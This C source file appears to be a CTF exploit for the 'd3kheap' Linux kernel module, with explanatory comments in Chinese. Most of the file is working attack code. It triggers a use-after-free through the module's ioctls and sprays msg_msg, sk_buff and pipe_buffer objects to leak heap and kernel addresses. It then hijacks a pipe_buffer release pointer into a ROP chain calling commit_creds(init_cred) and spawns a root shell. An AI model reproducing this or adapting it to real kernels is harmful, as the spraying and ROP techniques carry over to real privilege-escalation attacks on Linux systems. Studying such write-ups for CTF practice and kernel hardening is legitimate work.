#define _GNU_SOURCE
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/syscall.h>

#define MSG_TAG 0x41414141
#define PRIMARY_MSG_TYPE 1
#define SECONDARY_MSG_TYPE 2
#define VICTIM_MSG_TYPE 0x11037
#define SK_BUFF_NUM 0x80

#define PIPE_NUM 0x100
#define SOCKET_NUM 0x10
#define MSG_QUEUE_NUM 0x1000

#define PRIMARY_MSG_SIZE 0x60
#define SECONDARY_MSG_SIZE 0x400

#define COMMIT_CREDS 0xffffffff810D25C0
#define POP_RDI_RET 0xffffffff810938f0
#define INIT_CRED 0xffffffff82c6d580
#define ANON_PIPE_BUF_OPS 0xffffffff8203fe40
#define PUSH_RSI_POP_RSP_POP_4VAL_RET 0xffffffff812dbede

// 此 gadget 是在 __mmu_interval_notifier_insert 附近错出的一个 gadget

#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00ff0


size_t kernel_offset, kernel_base = 0xffffffff81000000;
size_t user_cs, user_ss, user_rflags, user_sp;
int fd = 0;

/*
 * object 大小必会加上 320，因此需要申请 704 的大小
 * 1024 - 320 = 704
 */
char fake_secondary_msg[704];

typedef struct list_head{
    uint64_t    next;
    uint64_t    prev;
}list_head;

typedef struct msg_msg{
    list_head   m_list;
    uint64_t    m_type;
    uint64_t    m_ts;
    uint64_t    next;
    uint64_t    security;
}msg_msg;

typedef struct msg_msgseg{
    uint64_t    next;
}msg_msgseg;

struct {
    long mtype;
    char mtext[PRIMARY_MSG_SIZE - sizeof(struct msg_msg)];
}primary_msg;

struct 
{
    long mtype;
    char mtext[SECONDARY_MSG_SIZE - sizeof(struct msg_msg)];
}secondary_msg;

struct
{
    long mtype;
    char mtext[0x1000 - sizeof(struct msg_msg) + 0x1000 - sizeof(struct msg_msgseg)];
} oob_msg;

typedef struct pipe_buffer
{
    uint64_t    page;
    uint32_t    offset, len;
    uint64_t    ops;
    uint32_t    flags;
    uint32_t    padding;
    uint64_t    private;
}pipe_buffer;

typedef struct pipe_buf_operations
{
    uint64_t    confirm;
    uint64_t    release;
    uint64_t    try_steal;
    uint64_t    get;
}pipe_buf_operations;

void info(char *s ){
    printf("\033[34m\033[1m[Info] %s \033[0m\n", s);
}

void error(char *s){
    printf("\033[31m\033[1m[Error] %s\n\033[0m" , s);
    exit(1);
}

void lg(char *s , size_t address){
    printf("\033[32m\033[1m[Data] %s : \033[0m\033[35m\033[1m%#lx \033[0m\n", s, address);
}

void save_status(){
    __asm__(
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
    );
    info("status saved!");
}

void shell(){
    sleep(1);
    if (getuid()){
        error("Failed to get root");
        exit(0);
    }
    info("Get root!");
    execl("/bin/sh","sh",NULL);
}

void add( ){
    ioctl(fd , 0x1234);
}

void delete( ){
    ioctl(fd , 0xDEAD);
}

void buildMsg(
    msg_msg *msg, 
    uint64_t m_list_next,
    uint64_t m_list_prev, 
    uint64_t m_type, 
    uint64_t m_ts, 
    uint64_t next, 
    uint64_t security
    ){
    msg->m_list.next = m_list_next;
    msg->m_list.prev = m_list_prev;
    msg->m_type = m_type;
    msg->m_ts = m_ts;
    msg->next = next;
    msg->security = security;
}

int writeMsg(int msqid, void *msgp, size_t msgsz, long msgtyp){
    *(long*)msgp = msgtyp;
    return msgsnd(msqid, msgp, msgsz - sizeof(long), 0);
}

int readMsg(int msqid, void *msgp, size_t msgsz, long msgtyp){
    return msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, 0);
}

int peekMsg(int msqid, void *msgp, size_t msgsz, long msgtyp){
    return msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, MSG_COPY | IPC_NOWAIT);
}
// 读取而不释放

int spraySkBuff(int sk_socket[SOCKET_NUM][2], void *buf, size_t size){
    for (int i = 0; i < SOCKET_NUM; i++)
        for (int j = 0; j < SK_BUFF_NUM; j++){
            if (write(sk_socket[i][0], buf, size) < 0)
                return -1;
        }
    return 0;
}
// 控制大堆块

int freeSkBuff(int sk_socket[SOCKET_NUM][2], void *buf, size_t size){
    for (int i = 0; i < SOCKET_NUM; i++)
        for (int j = 0; j < SK_BUFF_NUM; j++)
            if (read(sk_socket[i][1], buf, size) < 0)
                return -1;
    return 0;
}

void main(){

    msg_msg  *nearby_msg ,*nearby_msg_prim ;
    pipe_buffer *pipe_buf_ptr;
    uint64_t victim_addr ;
    uint64_t *rop ;
    cpu_set_t cpu_set;
    pipe_buf_operations *ops_ptr;
    

    int pipe_fd[PIPE_NUM][2];
    int sk_sockets[SOCKET_NUM][2];
    int msqid[MSG_QUEUE_NUM];

    int victim_qid = -1;
    // __sock_create

    save_status();

    CPU_ZERO(&cpu_set);
    CPU_SET(0, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    for (int i = 0;i<SOCKET_NUM ;i++)
        socketpair(AF_UNIX , SOCK_STREAM , 0 , sk_sockets[i]);

    // 创建后续利用需要的 sk 结构体

    fd = open("/dev/d3kheap" , O_RDONLY);

    for (int i = 0; i < MSG_QUEUE_NUM; i++)
        msqid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);

    // 创建大量 msg_queue 结构体，后面会和 msg_msg 链起来

    memset(&primary_msg, 0, sizeof(primary_msg));
    memset(&secondary_msg, 0, sizeof(secondary_msg));

    add();

    for (int i = 0; i< MSG_QUEUE_NUM; i++){

        *(int *)&primary_msg.mtext[0] = MSG_TAG;
        *(int *)&primary_msg.mtext[4] = i;
        if (writeMsg(msqid[i] , &primary_msg , sizeof(primary_msg) ,PRIMARY_MSG_TYPE )<0)
            error("send primary msg error");

        *(int *)&secondary_msg.mtext[0] = MSG_TAG;
        *(int *)&secondary_msg.mtext[4] = i;
        if (writeMsg(msqid[i] , &secondary_msg , sizeof(secondary_msg) ,SECONDARY_MSG_TYPE )<0)
            error("send secondary msg error");

        if (i == 1024)
            delete();
    }

    info("mod_buf_pointer <--> msg_msg");
    // msgsnd 发送大量信息，此时会申请 msg_msg 结构体
    // 其中第二次申请的 msg_msg 大小为 1024 ，很大可能会申请到中间 模块 释放的堆块

    delete();

    // 此时让 secondary msg 释放进入 slub-1024

    buildMsg(
        (msg_msg *)fake_secondary_msg,
        0,0,0,
        SECONDARY_MSG_SIZE ,
        0,0
    );

    // 创建 fake msg_msg, 破坏 msg_msg 用于找出 msg_msg

    if (spraySkBuff(sk_sockets , fake_secondary_msg,sizeof(fake_secondary_msg))<0)
        error("failed to spray sk_buff!");

    info("msg_msg <--> sk_buf");
    // 通过 sk 结构体申请大量 1024 的结构体，此时有极大可能申请到刚刚释放出去的堆块
    // 此时某一块 msg_msg 和 sk_buf 为同一个指针
    // 并向其中放置了 fake msg_msg 

    for (int i = 0; i < MSG_QUEUE_NUM; i++)
    {
        if (peekMsg(msqid[i], &secondary_msg, sizeof(secondary_msg), 1) < 0)
        {
            victim_qid = i;
            lg("victim_qid" , victim_qid);
        }
    }
    // 通过 msgrcv 找出已经被破坏掉的 msg_msg 结构体

    if (freeSkBuff(sk_sockets , fake_secondary_msg , sizeof(fake_secondary_msg)) < 0)
        error("failed to release sk_buff!");
    // 清空 sk_buf 

    buildMsg(
        (msg_msg *)fake_secondary_msg,
        0,0,
        VICTIM_MSG_TYPE,
        0x1000 - sizeof(struct msg_msg) ,
        0,0
    );

    // 修改 fake msg_msg 的 type 并改大 size 从而可以泄露出 堆地址

    if (spraySkBuff(sk_sockets , fake_secondary_msg,sizeof(fake_secondary_msg)) < 0)
        error("failed to spray sk_buff!");

    info("msg_msg <--> sk_buf");

    // 再次堆喷将 sk 的 object 和 msg_msg 连接
    // 此时再次修改 msg_msg

    if (peekMsg(msqid[victim_qid] , &oob_msg , sizeof(oob_msg) , 1 ) < 0)
        error("failed to read victim msg!");

    if (*(int *)&oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)
        error("failed to rehit the UAF object!");

    nearby_msg = (msg_msg *) &oob_msg.mtext[SECONDARY_MSG_SIZE - sizeof(msg_msg)];

    // 找出泄露出的下一个结构体，从而泄露出 msg_queue

    lg("msg_queue_addr" , nearby_msg->m_list.prev);

    if (freeSkBuff( sk_sockets,fake_secondary_msg , sizeof(fake_secondary_msg) ) < 0)
        error("failed to release sk_buff!");

    buildMsg(
        (msg_msg *)fake_secondary_msg,
        0,0,
        VICTIM_MSG_TYPE,
        sizeof(oob_msg.mtext) ,
        nearby_msg->m_list.prev - 8,
        0
    );

    // 将指针指向 msg_queue 从而泄露出当前 msg_msg 的指针

    if (spraySkBuff(sk_sockets , fake_secondary_msg,sizeof(fake_secondary_msg)) < 0)
        error("failed to spray sk_buff!");

    // 再次堆喷 sk object 修改 msgmsg 

    if (peekMsg(msqid[victim_qid] , &oob_msg , sizeof(oob_msg) , 1 ) < 0)
        error("failed to read victim msg!");

    if (*(int *)&oob_msg.mtext[0x1000] != MSG_TAG)
        error("failed to rehit the UAF object!");

    nearby_msg_prim = (msg_msg *)&oob_msg.mtext[0x1000 - sizeof(msg_msg)];
    victim_addr = nearby_msg_prim->m_list.next - 0x400;

    lg("victim_addr" ,victim_addr);
    // 读出 msgmsg 的指向泄露出 msgmsg 的地址

    if (freeSkBuff(sk_sockets, fake_secondary_msg, sizeof(fake_secondary_msg)) < 0)
        error("failed to release sk_buff!");

    memset(fake_secondary_msg , 0 , sizeof(fake_secondary_msg));
    buildMsg(
        (msg_msg *)fake_secondary_msg,
        victim_addr + 0x800 , victim_addr + 0x800,
        VICTIM_MSG_TYPE,
        SECONDARY_MSG_SIZE - sizeof( msg_msg),
        0,0
    );

    if (spraySkBuff(sk_sockets , fake_secondary_msg,sizeof(fake_secondary_msg)) < 0)
        error("failed to spray sk_buff!");

    // 再次伪造 msgmsg 结构体

    if (readMsg(msqid[victim_qid], &secondary_msg, sizeof(secondary_msg), VICTIM_MSG_TYPE) < 0)
        error("failed to receive secondary msg!");

    // 从伪造 msgmsg 结构体读取，此时会释放掉 msgmsg 结构体

    for (int i = 0; i < PIPE_NUM; i++)
    {
        if (pipe(pipe_fd[i]) < 0)
            error("failed to create pipe!");

        if (write(pipe_fd[i][1], "deadbeef", 8) < 0)
            error("failed to write the pipe!");
    }

    info("sk_buf <--> pipe_buf");

    // 堆喷 pipe 结构体，此时 sk_buf 能控制 pipe_buf

    pipe_buf_ptr = (pipe_buffer *) &fake_secondary_msg;
    // 将 buffer 转化为 pipe_buffer 结构体，从而找到内核指针

    for (int i = 0; i < SOCKET_NUM; i++){
        for (int j = 0; j < SK_BUFF_NUM; j++){
            if (read(sk_sockets[i][1], &fake_secondary_msg, sizeof(fake_secondary_msg)) < 0)
                error("failed to release sk_buff!");
            if (pipe_buf_ptr->ops > 0xffffffff81000000){
                kernel_offset = pipe_buf_ptr->ops - ANON_PIPE_BUF_OPS;
                kernel_base = 0xffffffff81000000 + kernel_offset;
            }
        }
    }

    // 从众多的 sk_buf 中找到 pipe_buf

    // 接下来就是劫持控制流了，劫持 pipe_buffer->ops->release
    // 最后是 rop 链的构造环节

    pipe_buf_ptr = (pipe_buffer *) &fake_secondary_msg;

    pipe_buf_ptr->page = *(uint64_t *)"114514";
    pipe_buf_ptr->ops = victim_addr + 0x100;


    ops_ptr = (pipe_buf_operations *) &fake_secondary_msg[0x100];
    ops_ptr->release = PUSH_RSI_POP_RSP_POP_4VAL_RET + kernel_offset;

    rop = (uint64_t *) &fake_secondary_msg[0x20];
    int i = 0;

    rop[i++] = POP_RDI_RET + kernel_offset;
    rop[i++] = INIT_CRED + kernel_offset;
    rop[i++] = COMMIT_CREDS + kernel_offset;

    rop[i++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + kernel_offset + 22;
    rop[i++] = 0;
    rop[i++] = 0;
    rop[i++] = (uint64_t)shell;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    lg("PUSH_RSI_POP_RSP_POP_4VAL_RET",PUSH_RSI_POP_RSP_POP_4VAL_RET + kernel_offset);

    if (spraySkBuff(sk_sockets, fake_secondary_msg, sizeof(fake_secondary_msg)) < 0)
        error("failed to spray sk_buff!");

    // 往 sk_buf object 中写 fake_pipe_buffer 结构体从而控制某一 pipe_buffer

    getchar();

    for (int i = 0; i < PIPE_NUM; i++)
    {
        close(pipe_fd[i][0]);
        close(pipe_fd[i][1]);
    }

}
